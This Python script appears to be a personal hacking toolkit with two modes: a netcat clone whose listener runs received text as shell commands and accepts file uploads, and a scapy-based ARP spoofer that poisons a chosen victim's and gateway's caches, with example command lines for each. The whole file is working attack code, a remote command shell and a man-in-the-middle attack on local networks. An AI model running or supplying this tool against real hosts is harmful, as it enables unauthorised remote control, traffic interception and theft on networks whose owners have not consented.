import os
import argparse
import textwrap
import sys
import socket
import threading
import subprocess
import errno
import time
import ctypes
from platform import system


# Setting colors for the output
# to make it easier to read
underline='\033[4m'
remove_underline='\033[24m'
color_block='\033[38;5;'
color_34=f'{color_block}34m'
color_75=f'{color_block}75m'
color_160=f'{color_block}160m'
color_123=f'{color_block}123m'
color_124=f'{color_block}124m'
color_139=f'{color_block}139m'
color_145=f'{color_block}145m'
color_146=f'{color_block}146m'
color_196=f'{color_block}196m'
color_251=f'{color_block}251m'
reset_colors='\033[0m'


def netcat_parser(sub_parser):
    netcat_parser=sub_parser.add_parser(
        'nc',
        description=f"{color_251}My simple net tool{color_146}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            f"""{color_145}Example:
        nc.py nc -t 192.168.1.108 -p 5555 -lc\t#start a command shell (listener side)              
        nc.py nc -t 192.168.1.108 -p 5555 -c\t#start a command shell (sender side)

        nc.py nc -t 192.168.1.108 -p 5555 -lu\t#upload a file (listener side)
        nc.py nc -t 192.168.1.108 -p 5555 -u\t#upload a file (sender side)
        
        nc.py nc -t 192.168.1.108 -p 5555 -luc\t#upload a file and then start a shell (listener side)
        nc.py nc -t 192.168.1.108 -p 5555 -uc\t#upload a file and then start a shell (sender side)


        nc.py nc -t 192.168.1.108 -p 5555\t# connect to server

        The default ip is 0.0.0.0 and the default port is 5555{reset_colors}
        """
        )
        )

    netcat_parser.add_argument("-c", "--command", action="store_true", help="Starts a shell")
    netcat_parser.add_argument("-p", "--port", type=int, default=5555, help="specified port")
    netcat_parser.add_argument("-u", "--upload", action="store_true",help="upload a file")
    netcat_parser.add_argument("-l", "--listen", action="store_true", help="listen")
    netcat_parser.add_argument("-t", "--target", default="0.0.0.0")

def arp_parser(sub_parser):
    arp_parser=sub_parser.add_parser(
        'arp',
        description=f"{color_251}Simple ARP spoofing tool{color_146}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
        f"""{color_145}Example:
        nc.py arp -v 192.168.1.31 -i wlan0 -g 192.168.1.1{reset_colors}
        """
        )
        )
    arp_parser.add_argument('-v','--victim',help='Set the victim\'s ip address',required=True)
    arp_parser.add_argument('-g','--gateway',default='192.168.1.1',help='Set the gateway\'s ip address')
    arp_parser.add_argument('-i','--interface',help='Set the interface name',required=True)    

def execute(command):
    command=command.strip()
    if command[0:2]=="cd": # this allows you to change the directory, normally you couldn't
        try:
            os.chdir(command[2::].strip())
            return ""
        except FileNotFoundError as e:
                return str(e)+'\n'
        except:
            raise
    output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    if output.stderr.decode():
        return output.stderr.decode()
    return output.stdout.decode()

def require_root():
    if system()=='Linux' and os.getuid()!=0 : # when running arp spoof you must be root
        print(f"{color_124}{underline}This script must be run as root.{reset_colors}")
        sys.exit(1)
    if system()=='Windows' and not ctypes.windll.shell32.IsUserAnAdmin():
        print(f"{color_124}{underline}This script must be run as Administrator.{reset_colors}")
        sys.exit(1)

class Netcat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
            return
        self.send()

    def send(self):
        # To check if you are already connected
        try:
            self.socket.connect((self.args.target, self.args.port))
        except OSError as e:
            if e.errno == errno.EISCONN:
                print(f'{color_34}{str(e).split(maxsplit=2)[-1]}{reset_colors}')
                pass
            else:
                raise
        
        #Upload a file
        if self.args.upload:
            client_thread=threading.Thread(target=self.handle,args=(self.socket,))
            client_thread.run()
        
        # The shell
        try:
            while True:
                buffer = input(f"{color_251}> ")+"\n"
                self.socket.send(buffer.encode())
                if buffer=='exit\n':
                    print(f"{color_124}Connection Closed{reset_colors}")
                    self.exit()
                recv_len = 1
                response = ""
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(f'{color_75}{response}{reset_colors}')

        except KeyboardInterrupt:
            print(f"{color_124}user terminated.{reset_colors}")
            self.exit()
        except BrokenPipeError:
            print(f"{color_124}The server is down{reset_colors}")
            self.exit()
        except:
            raise

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(1)
        
        # Starts the client thread
        clinet_socket = self.socket.accept()[0]
        client_thread = threading.Thread(target=self.handle, args=(clinet_socket,))
        client_thread.start() 

    def handle(self, clinet_socket):
        if self.args.upload:

            # Uplaoding a file (receiver side)
            if self.args.listen:
                try:
                    # Receiving a header containing meta data needed to download the file
                    fname_len=int.from_bytes(Netcat.recv_exact(clinet_socket,4),'big')
                    fname=Netcat.recv_exact(clinet_socket,fname_len).decode()
                    f_len=int.from_bytes(Netcat.recv_exact(clinet_socket,8),'big')
                    with open(fname,'wb') as f:
                        received=0
                        while received<f_len:
                            # Receiving and writing the file in chunks, one chunk at a time so large files don't consume memory
                            chunk=clinet_socket.recv(min(4096,f_len-received))
                            if not chunk:
                                raise ConnectionError(f"{color_124}Connection corrupted: The sender closed early{reset_colors}")
                            received+=len(chunk)
                            f.write(chunk)
                        del(received)
                except ConnectionError as e:
                    # print(f"{color_124}Upload failed: {e}{reset_colors}")
                    # if the upload failed and you setted --command option to true, then start a shell, other wise just close an
                    if self.args.command:
                        return
                    self.exit()

                # After finishing uploading the file, if you setted --command option to true start a shell, other wise close the program 
                if not self.args.command:
                    self.exit()
            
            # Uplaoding a file (sender side)
            else:
                # Creating headers containing meta data needed to upload the file
                fpath=input(f'{color_139}Path: ').strip()
                print(reset_colors,end='') # to reset_colors after inputting the filename
                fname=fpath.split('/')[-1]
                fname_len=len(fname.encode())
                fsize=os.path.getsize(fpath)
                clinet_socket.sendall(fname_len.to_bytes(4,'big'))
                clinet_socket.sendall(fname.encode())
                clinet_socket.sendall(fsize.to_bytes(8,'big'))
                try:
                    # Reading and sending the file in chunks, one chunk at a time so large files don't consume memory
                    with open(fpath,'rb') as f:
                        sent=0
                        while True:
                            chunk=f.read(4096)
                            if not chunk:
                                break
                            clinet_socket.sendall(chunk)
                            sent+=len(chunk)
                            print(f"\r{color_139}Sent: {(sent/fsize)*100:.2f}",end='',flush=True)
                        print(reset_colors)# Go down a new line and reset colors
                except Exception as e:
                    print(f"{color_124}Error: {e}{reset_colors}")
                print(f"{color_34}Done.{reset_colors}")
                self.args.upload=False 

                # If the --commnad option is true, start a shell after uploading the file
                if self.args.command:
                    self.send()
                sys.exit()

        # Here the sent commands are received and executed
        if self.args.command:
            cmd_buffer = b""
            while True:
                try:
                    while "\n" not in cmd_buffer.decode():
                        cmd_buffer += clinet_socket.recv(64)
                    response = cmd_buffer.decode()
                    if response.strip()=='exit':
                        print(f"{color_124}Connection closed.{reset_colors}")
                        self.exit()
                    response=execute(response)
                    if not response:
                        response+='\n'
                    if response:
                        clinet_socket.send(response.encode())
                    cmd_buffer = b""
                except Exception as e:
                    print(f"{color_124}server killed {e}{reset_colors}")
                    self.exit()

    # A static method to receive the meta data correctly, since the whole upload process depends on them
    @staticmethod                    
    def recv_exact(clinet_socket,length):
        data=b''
        while len(data)<length:
            chunk=clinet_socket.recv(length-len(data))
            if not chunk:
                print(f"{color_124}Connection currpted!{reset_colors}")
                break
            data+=chunk
        return data
    
    def exit(self):
        self.socket.close()
        sys.exit()

class ArpSpoofer:
    def __init__(self,args):
        self.interface=args.interface
        self.victim_mac=None
        self.victim_ip=args.victim
        self.gateway_mac=None
        self.gateway_ip=args.gateway

        
    def get_mac(self,ip):
        request=scapy.ARP(pdst=ip)
        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet=broadcast/request
        
        # If an arp reply is not received, either retry sending the request or stop the attack
        while True: 
            answer=scapy.srp(final_packet,iface=self.interface,timeout=2,verbose=False)[0]
            if not answer:
                print(f'{color_160}No arp reply was received.{reset_colors}\n{color_251}Try Again? [y/n]:{reset_colors}',end='')
                Ans=input().lower()
                if Ans=="y"or Ans=="yes":
                    continue
                sys.exit(1)
            return answer[0][1].hwsrc

    def spoof(self): 
        packet_for_victim=scapy.Ether(dst=self.victim_mac)/scapy.ARP(
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.gateway_ip,
            op=2 
            )
        
        packet_for_gateway=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.victim_ip,
            op=2
        )

        scapy.sendp(packet_for_victim, iface=self.interface, verbose=False)
        print(f"{color_251}Spoofing {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} pretending to be {color_196}{underline}{self.victim_ip}{remove_underline}{color_251}...{reset_colors}")
        
        scapy.sendp(packet_for_gateway,iface=self.interface,verbose=False)
        print(f"{color_251}Spoofing {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} pretending to be {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251}...{reset_colors}")

    def restore(self):
        # Restore each host to its original state

        # restoring the Gateway
        packet=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(psrc=self.victim_ip,hwsrc=self.victim_mac,pdst=self.gateway_ip,hwdst=self.gateway_mac, op=2)

        # Sending the packet multiple times to make sure the gateway restores its arp cache table
        for _ in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
            time.sleep(0.1)
        print(f'\n{color_34}Done.{reset_colors}')

        # Restoing the Victim
        packet=scapy.Ether(dst=self.victim_mac)/scapy.ARP(psrc=self.gateway_ip,hwsrc=self.gateway_mac,pdst=self.victim_ip,hwdst=self.victim_mac,op=2)

        # Sending the packet multiple times to make sure the victim restores its arp cache table
        for _ in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
            time.sleep(0.1)
        print(f'\n{color_34}Done.{reset_colors}')
        return
    
    def run(self):
        self.gateway_mac=self.get_mac(self.gateway_ip)
        self.victim_mac=self.get_mac(self.victim_ip)
        try:
            while True:
                self.spoof()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{color_251}Stopping...{reset_colors}")
        finally: # A finally block is essential, what ever happens the code must restore victim and gateway.
            self.restore()


def main():
    parser = argparse.ArgumentParser(description="Choose what mode you want to use:")
    sub_parsers=parser.add_subparsers(dest='mode',required=True)
    
    netcat_parser(sub_parsers)
    arp_parser(sub_parsers)

    args = parser.parse_args()
    
    if args.mode=='nc':
        buffer=''
        nc = Netcat(args, buffer.encode())
        nc.run()
    elif args.mode=='arp':
        global scapy
        import scapy.all as scapy
        require_root() # you must be root to start the arp spoof attack 
        spoofer=ArpSpoofer(args)
        spoofer.run()

if __name__ == "__main__":
    main()
